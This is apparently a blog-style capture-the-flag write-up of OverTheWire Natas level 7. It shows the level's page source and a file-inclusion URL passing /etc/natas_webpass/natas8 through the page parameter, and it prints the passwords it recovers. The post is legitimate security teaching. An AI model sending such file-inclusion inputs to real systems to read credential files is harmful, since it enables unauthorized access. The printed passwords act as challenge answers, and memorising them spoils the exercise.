+++
title = "Level 7"
date = 2025-03-27T14:45:00+01:00
draft = false
+++

-   State "DONE"       from              <span class="timestamp-wrapper"><span class="timestamp">[2025-03-27 Thu 14:45]</span></span>

<http://natas7.natas.labs.overthewire.org/>

The next level is a bit more cryptic, all we see is this webpage with a "Home" and "About" section.

{{< figure src="/ox-hugo/clipboard-20250224T165744.png" >}}

A look at the page source for this site shows us a hint though:

```web { linenos=true, linenostart=1 }

<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
    <body>
        <h1>natas7</h1>
        <div id="content">

            <a href="index.php?page=home">Home</a>
            <a href="index.php?page=about">About</a>
            <br>
            <br>
            this is the front page

            <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
        </div>
    </body>
</html>
```

Apparently the password for the user natas8 is in `/etc/natas_webpass/natas8`. Appending this simply to the webpage does not produce the result we want. However, if we look closer at the url constructor, we see that it uses `?page=home` as the constructor for home. So we try and insert the filepath above instead of home:

```web
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

And this gives us the pass for natas8:

-   xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
